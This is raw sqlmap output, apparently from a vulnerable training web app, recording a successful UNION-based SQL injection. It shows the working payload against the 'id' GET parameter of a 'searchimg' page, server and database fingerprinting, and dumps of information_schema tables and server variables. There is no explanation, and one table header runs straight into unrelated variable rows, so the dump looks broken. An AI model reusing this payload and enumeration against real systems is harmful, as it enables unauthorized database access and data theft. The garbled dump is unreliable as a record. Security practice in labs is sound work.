sqlmap identified the following injection point(s) with a total of 35 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: page=searchimg&id=1 UNION ALL SELECT CONCAT(0x716a767071,0x4a615a5750424268724f6342597a4a78444b4b43737a596e576470755a426b78754c586d63686f6e,0x717a6b6b71),NULL-- -&Submit=Submit
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.4.6, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
Database: information_schema
Table: KEY_COLUMN_USAGE
[5 entries]
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| TABLE_SCHEMA         | TABLE_NAME   | TABLE_CATALOG | COLUMN_NAME   | ORDINAL_POSITION | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA    | CONSTRAINT_CATALOG   | REFERENCED_TABLE_NAME | REFERENCED_COLUMN_NAME | REFERENCED_TABLE_SCHEMA | POSITION_IN_UNIQUE_CONSTRAINT |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| Member_Brute_Force   | db_default   | def           | id            | 1                | PRIMARY           | Member_Brute_Force   | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_Sql_Injection | users        | def           | user_id       | 1                | PRIMARY           | Member_Sql_Injection | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_guestbook     | guestbook    | def           | id_comment    | 1                | PRIMARY           | Member_guestbook     | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_images        | list_images  | def           | id            | 1                | PRIMARY           | Member_images        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_survey        | vote_dbs     | def           | id_vote       | 1                | PRIMARY           | Member_survey        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+

Database: information_schema
Table: COLLATIONS
[202 entries]
+-----+---------+------------+-------------+--------------------------+--------------------+
| ID  | SORTLEN | IS_DEFAULT | IS_COMPILED | COLLATION_NAME           | CHARACTER_SET_NAME |
| SSL_CA                                            | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| INNODB_LOG_GROUP_HOME_DIR                         | ./                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| REPLICATE_IGNORE_DB                               | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| USERSTAT                                          | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| IGNORE_DB_DIRS                                    | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| LOCKED_IN_MEMORY                                  | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| MAX_ALLOWED_PACKET                                | 16777216                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| INNODB_LOCKING_FAKE_CHANGES                       | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| READ_RND_BUFFER_SIZE                              | 262144                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| BIG_TABLES                                        | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| STORED_PROGRAM_CACHE                              | 256                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SSL_KEY                                           | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| SECURE_AUTH                                       | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| JOIN_CACHE_LEVEL                                  | 2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| SLAVE_SKIP_ERRORS                                 | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| OLD_ALTER_TABLE                                   | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SLAVE_SQL_VERIFY_CHECKSUM                         | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| RELAY_LOG_PURGE                                   | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| VERSION_COMPILE_OS                                | debian-linux-gnu                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| INNODB_USE_SYS_STATS_TABLE                        | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| PROGRESS_REPORT_TIME                              | 5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_USE_STACKTRACE                             | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SQL_WARNINGS                                      | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| INNODB_LOG_BUFFER_SIZE                            | 8388608                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| DIV_PRECISION_INCREMENT                           | 4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_STATS_UPDATE_NEED_LOCK                     | 1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| DATETIME_FORMAT                                   | %Y-%m-%d %H:%i:%s                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_MAX_PURGE_LAG                              | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| SLAVE_NET_TIMEOUT                                 | 3600                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| MYISAM_MAX_SORT_FILE_SIZE                         | 9223372036853727232                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| QUERY_CACHE_STRIP_COMMENTS                        | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SLAVE_TYPE_CONVERSIONS                            | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| SLAVE_TRANSACTION_RETRIES                         | 10                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| SQL_NOTES                                         | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| PLUGIN_DIR                                        | /usr/lib/mysql/plugin/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| OLD_MODE                                          | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| BINLOG_ANNOTATE_ROW_EVENTS                        | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| HAVE_PARTITIONING                                 | YES                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| LOG_SLAVE_UPDATES                                 | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| INNODB_IBUF_ACTIVE_CONTRACT                       | 1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_FILE_PER_TABLE                             | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| HAVE_COMPRESS                                     | YES                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| MYISAM_STATS_METHOD                               | nulls_unequal                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| INNODB_USE_ATOMIC_WRITES                          | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ARIA_SORT_BUFFER_SIZE                             | 134217728                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| INNODB_DICT_SIZE_LIMIT                            | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| SYSTEM_TIME_ZONE                                  | CET                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| INNODB_DOUBLEWRITE                                | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| PERFORMANCE_SCHEMA_MAX_FILE_INSTANCES             | 10000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| TIME_FORMAT                                       | %H:%i:%s                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| LOG_SLOW_QUERIES                                  | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| DEFAULT_WEEK_FORMAT                               | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_BUFFER_POOL_SHM_KEY                        | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| LOG_OUTPUT                                        | FILE                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ROWID_MERGE_BUFF_SIZE                             | 8388608                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| PERFORMANCE_SCHEMA_MAX_TABLE_INSTANCES            | 50000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ARIA_LOG_PURGE_TYPE                               | immediate                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| INNODB_USE_NATIVE_AIO                             | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| MAX_JOIN_SIZE                                     | 18446744073709551615                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| SQL_LOG_OFF                                       | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ARIA_PAGECACHE_AGE_THRESHOLD                      | 300                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| TIME_ZONE                                         | SYSTEM                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| HAVE_NDBCLUSTER                                   | NO                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| INNODB_TRACK_CHANGED_PAGES                        | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SLOW_QUERY_LOG_FILE                               | BornToSecWeb-slow.log                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| DEADLOCK_SEARCH_DEPTH_SHORT                       | 4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| SQL_SLAVE_SKIP_COUNTER                            | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| FT_MIN_WORD_LEN                                   | 4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| COLLATION_DATABASE                                | latin1_swedish_ci                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| DEBUG_NO_THREAD_ALARM                             | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
